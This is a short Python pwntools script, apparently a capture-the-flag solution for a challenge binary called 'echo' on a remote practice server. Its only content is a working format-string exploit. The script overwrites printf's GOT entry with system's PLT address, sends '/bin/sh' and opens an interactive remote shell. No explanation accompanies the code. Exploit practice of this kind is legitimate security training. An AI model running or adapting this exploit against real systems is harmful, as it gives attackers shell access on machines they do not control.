from pwn import *
context.log_level = 'debug'

p="./echo"

context.binary=p
#io=process(p)
io=remote("hackme.inndy.tw",7711)

system_plt=ELF(p).plt['system']
printf_got=ELF(p).got['printf']

payload=fmtstr_payload(7, {printf_got:system_plt})
io.sendline(payload)
io.sendline('/bin/sh\x00')

io.interactive()
